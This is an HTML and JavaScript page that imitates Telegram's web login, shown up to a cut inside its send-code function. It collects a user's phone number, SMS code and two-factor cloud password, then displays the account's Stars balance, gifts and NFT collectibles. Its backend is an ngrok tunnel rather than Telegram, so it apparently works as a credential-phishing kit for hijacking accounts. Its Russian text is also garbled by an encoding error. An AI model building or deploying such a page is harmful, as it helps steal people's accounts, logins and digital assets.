<!doctype html>
<html lang="ru">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>–í—Ö–æ–¥ –≤ Telegram WebApp</title>
    <!-- Tailwind CSS CDN -->
    <script src="https://cdn.tailwindcss.com"></script>
    <script>
        tailwind.config = {
            theme: {
                extend: {
                    colors: {
                        'tg-blue': '#4a95e6', /* –ù–∞—Å—ã—â–µ–Ω–Ω—ã–π —Å–∏–Ω–∏–π –¥–ª—è –∫–Ω–æ–ø–æ–∫ –∏ –∞–∫—Ü–µ–Ω—Ç–æ–≤ */
                        'tg-light-blue': '#a5d0f6',
                        'tg-border': '#e0e0e0',
                        'tg-text': '#222222',
                        'tg-placeholder': '#888888',
                        'tg-background': '#ffffff',
                        'tg-card': '#ffffff',
                        'tg-success': '#10B981',
                        'tg-error': '#EF4444',
                    },
                    fontFamily: {
                        sans: ['Inter', 'system-ui', '-apple-system', 'Segoe UI', 'Roboto', 'Arial', 'sans-serif'],
                    }
                }
            }
        }
    </script>
    <style>
        /* Base styles for the light theme */
        body { 
            font-family: 'Inter', sans-serif; 
            background: #f7f7f7; 
            color: var(--tg-text); 
            display: flex; 
            align-items: center; 
            justify-content: center; 
            min-height: 100vh; 
            padding: 20px;
        }


        /* Card and Header */
        .card { 
            background-color: var(--tg-card); 
            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1); /* Subtle shadow */
        }
        .header {
            color: var(--tg-text);
            text-align: center;
        }
        
        /* Input and Button Styles */
        .input-style {
            padding: 10px 0;
            border-bottom: 2px solid var(--tg-border);
            border-top: none;
            border-left: none;
            border-right: none;
            background: transparent;
            color: var(--tg-text);
            font-size: 16px;
            transition: border-color 0.3s;
        }
        .input-style:focus {
            outline: none;
            border-color: var(--tg-blue);
        }
        .input-style::placeholder {
            color: var(--tg-placeholder);
        }


        .phone-group {
            display: flex;
            align-items: flex-end;
            margin-top: 10px;
        }
        .code-display {
            padding: 10px 0;
            font-size: 16px;
            color: var(--tg-text);
            margin-right: 15px;
            border-bottom: 2px solid var(--tg-border);
            font-weight: 500;
        }
        
        /* Country Dropdown */
        .country-select-btn {
            border: none;
            border-bottom: 2px solid var(--tg-border);
            padding: 10px 0;
            background: transparent;
            color: var(--tg-text);
        }
        .country-select-btn:focus {
            border-color: var(--tg-blue);
            outline: none;
        }
        .country-dropdown-menu {
            max-height: 300px;
            box-shadow: 0 6px 20px rgba(0, 0, 0, 0.15);
        }
        .country-item:hover {
            background-color: #f0f0f0;
        }
        
        /* Code Input Styles (for Step 2) */
        .code-inputs-container {
            display: flex;
            justify-content: center;
            gap: 8px;
        }
        .code-input {
            width: 40px; 
            height: 50px; 
            text-align: center; 
            font-size: 20px;
            font-weight: bold;
            background: transparent;
            border: none;
            border-bottom: 3px solid #ccc;
            color: var(--tg-text);
            transition: border-color 0.2s, box-shadow 0.2s;
        }
        .code-input:focus {
            outline: none;
            border-color: var(--tg-blue) !important;
            box-shadow: none;
        }
        /* Color feedback for code input */
        .code-success { border-color: var(--tg-success) !important; animation: none; }
        .code-error { border-color: var(--tg-error) !important; animation: none; }
        
        /* Custom scrollbar */
        .custom-scroll::-webkit-scrollbar { width: 6px; }
        .custom-scroll::-webkit-scrollbar-thumb { background-color: #bbbbbb; border-radius: 3px; }
        .custom-scroll::-webkit-scrollbar-track { background-color: transparent; }


    </style>
</head>
<body class="bg-tg-background">
    <div class="card w-full max-w-sm bg-tg-card rounded-xl p-8 space-y-8">
        <!-- Header Section -->
        <div class="header space-y-4">
            <!-- Telegram Logo -->
            <div id="telegram-logo" class="flex justify-center">
                <div class="w-20 h-20 rounded-full bg-gradient-to-br from-[#2AABEE] to-[#229ED9] flex items-center justify-center shadow-lg transform transition-all duration-300 hover:scale-105">
                    <svg width="48" height="48" viewBox="0 0 240 240" fill="none" xmlns="http://www.w3.org/2000/svg">
                        <path d="M94.8 142.3L90.4 197.3C96.4 197.3 99.1 194.6 102.3 191.5L128.8 166.8L183.5 206.7C194.3 212.8 202 209.5 204.9 196.3L236.7 42.5L236.8 42.4C240.2 26.3 230.5 20 220 24.3L14.4 99.4C-0.9 105.5 -0.7 114.7 11.7 118.3L62.8 133.4L189.8 56.1C196.2 52 202 54.4 197.1 58.5L94.8 142.3Z" fill="white"/>
                    </svg>
                </div>
            </div>
            <div class="space-y-1">
                <h1 id="main-title" class="text-2xl font-semibold text-tg-text">–í–∞—à –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞</h1>
                <p id="main-description" class="text-sm text-gray-500 transition-all duration-300">
                    –ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –ø–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç–µ –∫–æ–¥ —Å—Ç—Ä–∞–Ω—ã –∏ –≤–≤–µ–¥–∏—Ç–µ –≤–∞—à –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞.
                </p>
            </div>
        </div>


        <!-- Step 1: Phone Number and Country Selector (White Theme Style) -->
        <div id="step-phone" class="step space-y-6">
            <!-- 1. Country Selection Dropdown with Search -->
            <div class="relative">
                <button id="country-select-btn" class="country-select-btn w-full flex items-center justify-between text-base">
                    <span id="selected-name" class="font-medium">–†–æ—Å—Å–∏—è</span>
                    <svg class="w-4 h-4 text-gray-400 ml-auto" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 9l-7 7-7-7"></path></svg>
                </button>
                <div id="country-dropdown" class="absolute z-10 hidden mt-3 w-full custom-scroll bg-tg-card rounded-xl country-dropdown-menu">
                    <div class="p-3 border-b border-tg-border">
                        <input id="country-search" type="text" placeholder="–ü–æ–∏—Å–∫ —Å—Ç—Ä–∞–Ω—ã..." class="w-full p-2 text-sm border border-tg-border rounded focus:border-tg-blue focus:ring-0 input-style !border !border-tg-border" onfocus="this.style.borderColor=tailwind.config.theme.extend.colors['tg-blue']" onblur="this.style.borderColor='var(--tg-border)'"/>
                    </div>
                    <div id="country-list" class="max-h-60 overflow-y-auto custom-scroll">
                        <!-- Country list will be injected here by JS -->
                    </div>
                </div>
            </div>


            <!-- 2. Phone Input (Code and Number) -->
            <div class="phone-group">
                <!-- Code Input (Read-only) -->
                <div id="selected-code-display" class="code-display">+7</div>
                <!-- Phone Input -->
                <input id="phone" type="tel" placeholder="999 888 77 66" class="w-full input-style" />
            </div>
            
            <button id="send-code" class="mt-8 w-full p-3 bg-tg-blue text-white font-semibold rounded-full shadow-lg hover:bg-sky-600 focus:outline-none focus:ring-4 focus:ring-tg-blue/50 transition duration-150 disabled:opacity-60 disabled:cursor-not-allowed">
                –î–∞–ª–µ–µ
            </button>
        </div>


        <!-- Step 2: Code Verification (5 Digits) -->
        <div id="step-code" class="step hidden text-center space-y-6">
            <label class="text-sm font-medium text-gray-500 mb-4 block">–í–≤–µ–¥–∏—Ç–µ 5-–∑–Ω–∞—á–Ω—ã–π –∫–æ–¥, –∫–æ—Ç–æ—Ä—ã–π –º—ã –æ—Ç–ø—Ä–∞–≤–∏–ª–∏ –≤–∞–º.</label>
            <div id="code-inputs" class="code-inputs-container">
                <!-- 5 Digit Code Inputs -->
                <input class="code-input" type="text" maxlength="1" data-index="0" inputmode="numeric" />
                <input class="code-input" type="text" maxlength="1" data-index="1" inputmode="numeric" disabled />
                <input class="code-input" type="text" maxlength="1" data-index="2" inputmode="numeric" disabled />
                <input class="code-input" type="text" maxlength="1" data-index="3" inputmode="numeric" disabled />
                <input class="code-input" type="text" maxlength="1" data-index="4" inputmode="numeric" disabled />
            </div>
        </div>


        <!-- Step 3: 2FA Password -->
        <div id="step-2fa" class="step hidden text-center space-y-6">
            <!-- –°–µ–∫—Ü–∏—è —Å –ø–æ–¥—Å–∫–∞–∑–∫–æ–π –∏/–∏–ª–∏ —Å–æ–æ–±—â–µ–Ω–∏–µ–º –æ–± –æ—Ç—Å—É—Ç—Å—Ç–≤–∏–∏ –ø–æ–¥—Å–∫–∞–∑–∫–∏, –æ–±–µ–∑—å—è–Ω–∞ —É–¥–∞–ª–µ–Ω–∞ -->

            <!-- –ü–æ–¥—Å–∫–∞–∑–∫–∞ –æ—Ç Telegram -->
            <div id="password-hint-container" class="hidden bg-blue-50 p-3 rounded-lg border border-blue-200">
                <p class="text-sm text-gray-700">
                    <span class="font-semibold text-tg-blue">üí° –ü–æ–¥—Å–∫–∞–∑–∫–∞:</span> <span id="password-hint" class="italic text-gray-600"></span>
                </p>
            </div>
            
            <!-- –°–æ–æ–±—â–µ–Ω–∏–µ –æ–± –æ—Ç—Å—É—Ç—Å—Ç–≤–∏–∏ –ø–æ–¥—Å–∫–∞–∑–∫–∏ -->
            <div id="no-hint-message" class="hidden bg-yellow-50 p-3 rounded-lg border border-yellow-200">
                <p class="text-xs text-gray-600">
                    ‚ö†Ô∏è –ü–æ–¥—Å–∫–∞–∑–∫–∞ –Ω–µ —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∞. <br>
                    <span class="text-gray-500">–í—ã –º–æ–∂–µ—Ç–µ –¥–æ–±–∞–≤–∏—Ç—å –µ—ë –≤ Telegram: –ù–∞—Å—Ç—Ä–æ–π–∫–∏ ‚Üí –ö–æ–Ω—Ñ–∏–¥–µ–Ω—Ü–∏–∞–ª—å–Ω–æ—Å—Ç—å ‚Üí –î–≤—É—Ö—ç—Ç–∞–ø–Ω–∞—è –∞—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏—è</span>
                </p>
            </div>

            <div class="field space-y-4 pt-4"> <!-- –î–æ–±–∞–≤–∏–ª –Ω–µ–º–Ω–æ–≥–æ –æ—Ç—Å—Ç—É–ø–∞, —Ç.–∫. —É–¥–∞–ª–∏–ª–∏ –æ–±–µ–∑—å—è–Ω—É -->
                <input id="password" type="password" placeholder="–ü–∞—Ä–æ–ª—å –æ–±–ª–∞—á–Ω–æ–≥–æ —Ö—Ä–∞–Ω–∏–ª–∏—â–∞ (2FA)" class="w-full input-style" />
            </div>
            <button id="verify-password" class="mt-4 w-full p-3 bg-tg-blue text-white font-semibold rounded-full shadow-lg hover:bg-sky-600 focus:outline-none focus:ring-4 focus:ring-tg-blue/50 transition duration-150">
                –í–æ–π—Ç–∏
            </button>
        </div>

        <!-- Step 4: Account Info -->
        <div id="step-account-info" class="step hidden space-y-6">
            <div class="text-center mb-4">
                <h2 class="text-xl font-semibold text-tg-text">‚úÖ –í—Ö–æ–¥ –≤—ã–ø–æ–ª–Ω–µ–Ω!</h2>
                <p id="user-name" class="text-sm text-gray-500 mt-1"></p>
            </div>

            <!-- Stars Balance -->
            <div class="bg-gradient-to-r from-yellow-50 to-orange-50 p-4 rounded-xl border border-yellow-200">
                <div class="flex items-center justify-between">
                    <div class="flex items-center gap-2">
                        <span class="text-2xl">‚≠ê</span>
                        <span class="font-semibold text-gray-700">Telegram Stars</span>
                    </div>
                    <span id="stars-balance" class="text-xl font-bold text-orange-600">0</span>
                </div>
            </div>

            <!-- Gifts -->
            <div id="gifts-container" class="bg-purple-50 p-4 rounded-xl border border-purple-200 hidden">
                <div class="flex items-center gap-2 mb-3">
                    <span class="text-2xl">üéÅ</span>
                    <span class="font-semibold text-gray-700">–ü–æ–¥–∞—Ä–∫–∏</span>
                    <span id="gifts-count" class="ml-auto bg-purple-200 px-2 py-1 rounded-full text-xs font-bold text-purple-700">0</span>
                </div>
                <div id="gifts-list" class="space-y-2 text-sm text-gray-600"></div>
            </div>

            <!-- NFT/Collectibles -->
            <div id="nft-container" class="bg-blue-50 p-4 rounded-xl border border-blue-200 hidden">
                <div class="flex items-center gap-2 mb-3">
                    <span class="text-2xl">üíé</span>
                    <span class="font-semibold text-gray-700">–ö–æ–ª–ª–µ–∫—Ü–∏–æ–Ω–Ω—ã–µ –ø—Ä–µ–¥–º–µ—Ç—ã</span>
                </div>
                <div id="collectibles-list" class="space-y-2 text-sm text-gray-600"></div>
            </div>
        </div>


        <!-- Status Message -->
        <p id="status" class="text-xs font-medium text-gray-500 text-center pt-3 transition-colors duration-300"></p>
    </div>


    <script>
        const API_BASE = 'https://supercritical-hatable-elanor.ngrok-free.dev'; // –≤–º–µ—Å—Ç–æ localhost';
        let sessionId = null;
        let selectedCountryData = null; 


        const byId = id => document.getElementById(id);
        const stepPhone = byId('step-phone');
        const stepCode = byId('step-code');
        const step2fa = byId('step-2fa');
        const stepAccountInfo = byId('step-account-info');
        const statusEl = byId('status');
        const mainDescription = byId('main-description');
        const mainTitle = byId('main-title');
        const telegramLogo = byId('telegram-logo');


        const phoneInput = byId('phone');
        const codeInputs = Array.from(document.querySelectorAll('.code-input'));
        const passwordInput = byId('password');
        
        const countrySearchInput = byId('country-search');
        const countryListContainer = byId('country-list');
        const selectedName = byId('selected-name'); 
        const selectedCodeDisplay = byId('selected-code-display');
        const countrySelectBtn = byId('country-select-btn');
        const countryDropdown = byId('country-dropdown');



        function show(el) { el.classList.remove('hidden'); }
        function hide(el) { el.classList.add('hidden'); }


        function setStatus(text, cls = 'text-gray-500') {
            statusEl.className = `text-xs font-medium text-center pt-3 ${cls}`.trim();
            statusEl.textContent = text;
        }


        function setMainDescription(text) {
            mainDescription.textContent = text;
        }

        function setMainTitle(text) {
            mainTitle.textContent = text;
        }

        function showLogo() {
            show(telegramLogo);
        }

        function hideLogo() {
            hide(telegramLogo);
        }

        /**
         * –û—á–∏—â–∞–µ—Ç –≤—Å–µ –ø–æ–ª—è –¥–ª—è –≤–≤–æ–¥–∞ –∫–æ–¥–∞ –∏ –æ—Ç–∫–ª—é—á–∞–µ—Ç –∏—Ö, –∫—Ä–æ–º–µ –ø–µ—Ä–≤–æ–≥–æ.
         */
        function clearCodeInputs() {
            codeInputs.forEach((input, index) => {
                input.value = '';
                // –°–±—Ä–∞—Å—ã–≤–∞–µ–º —Å—Ç–∏–ª–∏
                input.classList.remove('code-success', 'code-error');
                input.style.borderColor = '#ccc'; 

                // –î–µ–∞–∫—Ç–∏–≤–∏—Ä—É–µ–º –≤—Å–µ, –∫—Ä–æ–º–µ –ø–µ—Ä–≤–æ–≥–æ
                if (index > 0) {
                    input.disabled = true;
                } else {
                    input.disabled = false;
                }
            });
        }

        function displayAccountInfo(user, accountInfo) {
            // –°–∫—Ä—ã–≤–∞–µ–º –ª–æ–≥–æ—Ç–∏–ø –Ω–∞ —ç–∫—Ä–∞–Ω–µ –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ–± –∞–∫–∫–∞—É–Ω—Ç–µ
            hideLogo();
            
            // –û—Ç–æ–±—Ä–∞–∂–∞–µ–º –∏–º—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
            byId('user-name').textContent = user.name ? `–ü—Ä–∏–≤–µ—Ç, ${user.name}!` : '–ü—Ä–∏–≤–µ—Ç!';
            
            // –û—Ç–æ–±—Ä–∞–∂–∞–µ–º –±–∞–ª–∞–Ω—Å –∑–≤–µ–∑–¥
            byId('stars-balance').textContent = accountInfo.stars_balance || 0;
            
            // –û—Ç–æ–±—Ä–∞–∂–∞–µ–º –ø–æ–¥–∞—Ä–∫–∏
            if (accountInfo.gifts && accountInfo.gifts.length > 0) {
                show(byId('gifts-container'));
                byId('gifts-count').textContent = accountInfo.gifts.length;
                const giftsList = byId('gifts-list');
                giftsList.innerHTML = '';
                accountInfo.gifts.forEach((gift, index) => {
                    const giftDiv = document.createElement('div');
                    giftDiv.className = 'p-2 bg-white rounded-lg';
                    giftDiv.innerHTML = `
                        <div class="flex justify-between items-center">
                            <span class="font-medium">${gift.type || '–ü–æ–¥–∞—Ä–æ–∫'}</span>
                            <span class="text-xs text-gray-400">${gift.date ? new Date(gift.date).toLocaleDateString() : ''}</span>
                        </div>
                    `;
                    giftsList.appendChild(giftDiv);
                });
            } else {
                hide(byId('gifts-container'));
            }
            
            // –û—Ç–æ–±—Ä–∞–∂–∞–µ–º NFT/–∫–æ–ª–ª–µ–∫—Ü–∏–æ–Ω–Ω—ã–µ –ø—Ä–µ–¥–º–µ—Ç—ã
            if (accountInfo.has_nft && accountInfo.collectibles && accountInfo.collectibles.length > 0) {
                show(byId('nft-container'));
                const collectiblesList = byId('collectibles-list');
                collectiblesList.innerHTML = '';
                accountInfo.collectibles.forEach(item => {
                    const itemDiv = document.createElement('div');
                    itemDiv.className = 'p-2 bg-white rounded-lg';
                    let displayText = item.type;
                    if (item.username) {
                        displayText += `: @${item.username}`;
                    }
                    itemDiv.innerHTML = `
                        <div class="flex items-center gap-2">
                            <span class="text-lg">${item.type === 'Premium' ? '‚≠ê' : 'üîπ'}</span>
                            <span class="font-medium">${displayText}</span>
                            ${item.active ? '<span class="ml-auto text-xs bg-green-200 px-2 py-1 rounded-full text-green-700">–ê–∫—Ç–∏–≤–Ω–æ</span>' : ''}
                        </div>
                    `;
                    collectiblesList.appendChild(itemDiv);
                });
            } else {
                hide(byId('nft-container'));
            }
            
            // –ü–æ–∫–∞–∑—ã–≤–∞–µ–º —Å–µ–∫—Ü–∏—é —Å –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–µ–π
            hide(stepCode);
            hide(step2fa);
            show(stepAccountInfo);
        }


        // --- Country Data (More than 60, sorted by Russian name) ---
        const allCountries = [
            // Code, Name (RU), Flag, Max Length (Number only), Min Length (Number only)
            { code: '93', name: '–ê—Ñ–≥–∞–Ω–∏—Å—Ç–∞–Ω', flag: 'üá¶üá´', length: 9, minLength: 9 },
            { code: '32', name: '–ë–µ–ª—å–≥–∏—è', flag: 'üáßüá™', length: 9, minLength: 8 },
            { code: '359', name: '–ë–æ–ª–≥–∞—Ä–∏—è', flag: 'üáßüá¨', length: 9, minLength: 8 },
            { code: '55', name: '–ë—Ä–∞–∑–∏–ª–∏—è', flag: 'üáßüá∑', length: 11, minLength: 10 },
            { code: '84', name: '–í—å–µ—Ç–Ω–∞–º', flag: 'üáªüá≥', length: 9, minLength: 9 },
            { code: '509', name: '–ì–∞–∏—Ç–∏', flag: 'üá≠üáπ', length: 8, minLength: 8 },
            { code: '233', name: '–ì–∞–Ω–∞', flag: 'üá¨üá≠', length: 9, minLength: 8 },
            { code: '49', name: '–ì–µ—Ä–º–∞–Ω–∏—è', flag: 'üá©üá™', length: 11, minLength: 9 },
            { code: '30', name: '–ì—Ä–µ—Ü–∏—è', flag: 'üá¨üá∑', length: 10, minLength: 10 },
            { code: '995', name: '–ì—Ä—É–∑–∏—è', flag: 'üá¨üá™', length: 9, minLength: 8 },
            { code: '45', name: '–î–∞–Ω–∏—è', flag: 'üá©üá∞', length: 8, minLength: 8 },
            { code: '20', name: '–ï–≥–∏–ø–µ—Ç', flag: 'üá™üá¨', length: 10, minLength: 9 },
            { code: '972', name: '–ò–∑—Ä–∞–∏–ª—å', flag: 'üáÆüá±', length: 9, minLength: 9 },
            { code: '91', name: '–ò–Ω–¥–∏—è', flag: 'üáÆüá≥', length: 10, minLength: 10 },
            { code: '62', name: '–ò–Ω–¥–æ–Ω–µ–∑–∏—è', flag: 'üáÆüá©', length: 13, minLength: 9 }, 
            { code: '98', name: '–ò—Ä–∞–Ω', flag: 'üáÆüá∑', length: 10, minLength: 9 },
            { code: '353', name: '–ò—Ä–ª–∞–Ω–¥–∏—è', flag: 'üáÆüá™', length: 9, minLength: 7 },
            { code: '354', name: '–ò—Å–ª–∞–Ω–¥–∏—è', flag: 'üáÆüá∏', length: 7, minLength: 7 },
            { code: '34', name: '–ò—Å–ø–∞–Ω–∏—è', flag: 'üá™üá∏', length: 9, minLength: 9 },
            { code: '39', name: '–ò—Ç–∞–ª–∏—è', flag: 'üáÆüáπ', length: 10, minLength: 9 },
            { code: '7', name: '–ö–∞–∑–∞—Ö—Å—Ç–∞–Ω', flag: 'üá∞üáø', length: 10, minLength: 10 },
            { code: '1', name: '–ö–∞–Ω–∞–¥–∞', flag: 'üá®üá¶', length: 10, minLength: 10 },
            { code: '974', name: '–ö–∞—Ç–∞—Ä', flag: 'üá∂üá¶', length: 8, minLength: 7 },
            { code: '86', name: '–ö–∏—Ç–∞–π', flag: 'üá®üá≥', length: 11, minLength: 11 },
            { code: '82', name: '–ö–æ—Ä–µ—è (–Æ–≥)', flag: 'üá∞üá∑', length: 10, minLength: 9 },
            { code: '53', name: '–ö—É–±–∞', flag: 'üá®üá∫', length: 8, minLength: 6 },
            { code: '371', name: '–õ–∞—Ç–≤–∏—è', flag: 'üá±üáª', length: 8, minLength: 8 },
            { code: '370', name: '–õ–∏—Ç–≤–∞', flag: 'üá±üáπ', length: 8, minLength: 8 },
            { code: '352', name: '–õ—é–∫—Å–µ–º–±—É—Ä–≥', flag: 'üá±üá∫', length: 9, minLength: 6 },
            { code: '261', name: '–ú–∞–¥–∞–≥–∞—Å–∫–∞—Ä', flag: 'üá≤üá¨', length: 9, minLength: 8 },
            { code: '60', name: '–ú–∞–ª–∞–π–∑–∏—è', flag: 'üá≤üáæ', length: 10, minLength: 9 },
            { code: '52', name: '–ú–µ–∫—Å–∏–∫–∞', flag: 'üá≤üáΩ', length: 10, minLength: 10 },
            { code: '373', name: '–ú–æ–ª–¥–æ–≤–∞', flag: 'üá≤üá©', length: 8, minLength: 8 },
            { code: '976', name: '–ú–æ–Ω–≥–æ–ª–∏—è', flag: 'üá≤üá≥', length: 8, minLength: 8 },
            { code: '212', name: '–ú–∞—Ä–æ–∫–∫–æ', flag: 'üá≤üá¶', length: 9, minLength: 9 },
            { code: '31', name: '–ù–∏–¥–µ—Ä–ª–∞–Ω–¥—ã', flag: 'üá≥üá±', length: 10, minLength: 9 },
            { code: '64', name: '–ù–æ–≤–∞—è –ó–µ–ª–∞–Ω–¥–∏—è', flag: 'üá≥üáø', length: 8, minLength: 8 },
            { code: '47', name: '–ù–æ—Ä–≤–µ–≥–∏—è', flag: 'üá≥üá¥', length: 8, minLength: 8 },
            { code: '971', name: '–û–ê–≠', flag: 'üá¶üá™', length: 9, minLength: 9 },
            { code: '92', name: '–ü–∞–∫–∏—Å—Ç–∞–Ω', flag: 'üáµüá∞', length: 10, minLength: 10 },
            { code: '48', name: '–ü–æ–ª—å—à–∞', flag: 'üáµüá±', length: 9, minLength: 9 },
            { code: '351', name: '–ü–æ—Ä—Ç—É–≥–∞–ª–∏—è', flag: 'üáµüáπ', length: 9, minLength: 9 },
            { code: '7', name: '–†–æ—Å—Å–∏—è', flag: 'üá∑üá∫', length: 10, minLength: 10 },
            { code: '40', name: '–†—É–º—ã–Ω–∏—è', flag: 'üá∑üá¥', length: 9, minLength: 9 },
            { code: '1', name: '–°–®–ê', flag: 'üá∫üá∏', length: 10, minLength: 10 },
            { code: '966', name: '–°–∞—É–¥–æ–≤—Å–∫–∞—è –ê—Ä–∞–≤–∏—è', flag: 'üá∏üá¶', length: 9, minLength: 9 },
            { code: '381', name: '–°–µ—Ä–±–∏—è', flag: 'üá∑üá∏', length: 9, minLength: 8 },
            { code: '65', name: '–°–∏–Ω–≥–∞–ø—É—Ä', flag: 'üá∏üá¨', length: 8, minLength: 8 },
            { code: '421', name: '–°–ª–æ–≤–∞–∫–∏—è', flag: 'üá∏üá∞', length: 9, minLength: 9 },
            { code: '386', name: '–°–ª–æ–≤–µ–Ω–∏—è', flag: 'üá∏üáÆ', length: 8, minLength: 8 },
            { code: '66', name: '–¢–∞–∏–ª–∞–Ω–¥', flag: 'üáπüá≠', length: 9, minLength: 8 },
            { code: '886', name: '–¢–∞–π–≤–∞–Ω—å', flag: 'üáπüáº', length: 9, minLength: 9 },
            { code: '992', name: '–¢–∞–¥–∂–∏–∫–∏—Å—Ç–∞–Ω', flag: 'üáπüáØ', length: 9, minLength: 9 },
            { code: '993', name: '–¢—É—Ä–∫–º–µ–Ω–∏—Å—Ç–∞–Ω', flag: 'üáπüá≤', length: 8, minLength: 8 },
            { code: '90', name: '–¢—É—Ä—Ü–∏—è', flag: 'üáπüá∑', length: 10, minLength: 10 },
            { code: '998', name: '–£–∑–±–µ–∫–∏—Å—Ç–∞–Ω', flag: 'üá∫üáø', length: 9, minLength: 9 },
            { code: '380', name: '–£–∫—Ä–∞–∏–Ω–∞', flag: 'üá∫üá¶', length: 9, minLength: 9 },
            { code: '598', name: '–£—Ä—É–≥–≤–∞–π', flag: 'üá∫üáæ', length: 9, minLength: 8 },
            { code: '358', name: '–§–∏–Ω–ª—è–Ω–¥–∏—è', flag: 'üá´üáÆ', length: 10, minLength: 8 },
            { code: '33', name: '–§—Ä–∞–Ω—Ü–∏—è', flag: 'üá´üá∑', length: 9, minLength: 9 },
            { code: '385', name: '–•–æ—Ä–≤–∞—Ç–∏—è', flag: 'üá≠üá∑', length: 9, minLength: 8 },
            { code: '420', name: '–ß–µ—Ö–∏—è', flag: 'üá®üáø', length: 9, minLength: 9 },
            { code: '41', name: '–®–≤–µ–π—Ü–∞—Ä–∏—è', flag: 'üá®üá≠', length: 9, minLength: 9 },
            { code: '46', name: '–®–≤–µ—Ü–∏—è', flag: 'üá∏üá™', length: 9, minLength: 7 },
            { code: '593', name: '–≠–∫–≤–∞–¥–æ—Ä', flag: 'üá™üá®', length: 9, minLength: 9 },
            { code: '372', name: '–≠—Å—Ç–æ–Ω–∏—è', flag: 'üá™üá™', length: 7, minLength: 7 },
            { code: '81', name: '–Ø–ø–æ–Ω–∏—è', flag: 'üáØüáµ', length: 10, minLength: 10 },
            { code: '61', name: '–ê–≤—Å—Ç—Ä–∞–ª–∏—è', flag: 'üá¶üá∫', length: 9, minLength: 9 },
            { code: '43', name: '–ê–≤—Å—Ç—Ä–∏—è', flag: 'üá¶üáπ', length: 10, minLength: 10 },
            { code: '973', name: '–ë–∞—Ö—Ä–µ–π–Ω', flag: 'üáßüá≠', length: 8, minLength: 8 },
            { code: '880', name: '–ë–∞–Ω–≥–ª–∞–¥–µ—à', flag: 'üáßüá©', length: 10, minLength: 10 },
            { code: '375', name: '–ë–µ–ª–∞—Ä—É—Å—å', flag: 'üáßüáæ', length: 9, minLength: 9 },
            { code: '57', name: '–ö–æ–ª—É–º–±–∏—è', flag: 'üá®üá¥', length: 10, minLength: 10 },
            { code: '506', name: '–ö–æ—Å—Ç–∞-–†–∏–∫–∞', flag: 'üá®üá∑', length: 8, minLength: 8 },
            { code: '44', name: '–í–µ–ª–∏–∫–æ–±—Ä–∏—Ç–∞–Ω–∏—è', flag: 'üá¨üáß', length: 10, minLength: 10 },
        ].sort((a, b) => a.name.localeCompare(b.name, 'ru'));


        
        // --- Country Selector Logic (Updated with search and filtering) ---


        function selectCountry(country) {
            selectedCountryData = country;
            selectedName.textContent = country.name;
            selectedCodeDisplay.textContent = '+' + country.code;
            countryDropdown.classList.add('hidden');
            countrySearchInput.value = ''; // Clear search on select


            // Set max length for input field
            phoneInput.maxLength = country.length;


            // Simple formatting for placeholders
            let placeholderNumber = 'X'.repeat(country.length);
            let placeholderText = '';
            // Example: 3-3-4
            placeholderText = placeholderNumber.slice(0, 3) + ' ' + placeholderNumber.slice(3, 6) + ' ' + placeholderNumber.slice(6);
            
            phoneInput.placeholder = placeholderText.trim();
            phoneInput.focus();


            // Clear input if current value is invalid
            phoneInput.value = '';
            
            // Re-render list to ensure full list is available next time
            populateCountryDropdown(allCountries);
        }


        function createCountryItem(country) {
            const item = document.createElement('div');
            item.className = 'country-item flex items-center p-3 text-sm cursor-pointer transition duration-150';
            item.innerHTML = `<span class="mr-3">${country.name}</span> <span class="ml-auto text-gray-500 font-medium">+${country.code}</span>`;
            item.addEventListener('click', () => selectCountry(country));
            return item;
        }


        function populateCountryDropdown(countriesToDisplay) {
            countryListContainer.innerHTML = '';
            if (countriesToDisplay.length === 0) {
                 const item = document.createElement('div');
                 item.className = 'p-3 text-sm text-gray-500 text-center';
                 item.textContent = '–ù–µ—Ç —Ä–µ–∑—É–ª—å—Ç–∞—Ç–æ–≤';
                 countryListContainer.appendChild(item);
                 return;
            }
            countriesToDisplay.forEach(country => {
                countryListContainer.appendChild(createCountryItem(country));
            });
        }
        
        function filterCountries() {
            const query = countrySearchInput.value.toLowerCase().trim();
            const filtered = allCountries.filter(country => 
                country.name.toLowerCase().includes(query) || 
                country.code.includes(query)
            );
            populateCountryDropdown(filtered);
        }


        // Initialize with default country (Russia)
        populateCountryDropdown(allCountries);
        selectCountry(allCountries.find(c => c.code === '7' && c.name === '–†–æ—Å—Å–∏—è') || allCountries[0]);


        countrySelectBtn.addEventListener('click', () => {
            countryDropdown.classList.toggle('hidden');
            if (!countryDropdown.classList.contains('hidden')) {
                countrySearchInput.focus();
                filterCountries(); // Ensure list is current
            }
        });
        
        countrySearchInput.addEventListener('input', filterCountries);


        document.addEventListener('click', (event) => {
            if (!countrySelectBtn.contains(event.target) && !countryDropdown.contains(event.target)) {
                countryDropdown.classList.add('hidden');
            }
        });


        // --- Core Application Logic ---


        function getFullPhone() {
            const number = phoneInput.value.replace(/[^0-9]/g, ''); // Number part only
            return '+' + selectedCountryData.code + number;
        }


        async function sendCode() {
            const phone = getFullPhone().replace(/\s/g, '');
            const numberPart = phone.substring(selectedCountryData.code.length + 1);
            const minLength = selectedCountryData.minLength;
            const maxLength = selectedCountryData.length;


            // Validation check using min/max lengths
            if (numberPart.length < minLength || numberPart.length > maxLength) {
                setStatus(`–ù–æ–º–µ—Ä –¥–æ–ª–∂–µ–Ω —Å–æ–¥–µ—Ä–∂–∞—Ç—å –æ—Ç ${minLength} –¥–æ ${maxLength} —Ü–∏—Ñ—Ä –ø–æ—Å–ª–µ –∫–æ–¥–∞ —Å—Ç—Ä–∞–Ω—ã (+${selectedCountryData.code}).`, 'text-tg-error');
                return;
            }
            
            setStatus('–û—Ç–ø—Ä–∞–≤–ª—è—é –∫–æ–¥...', 'text-tg-blue');
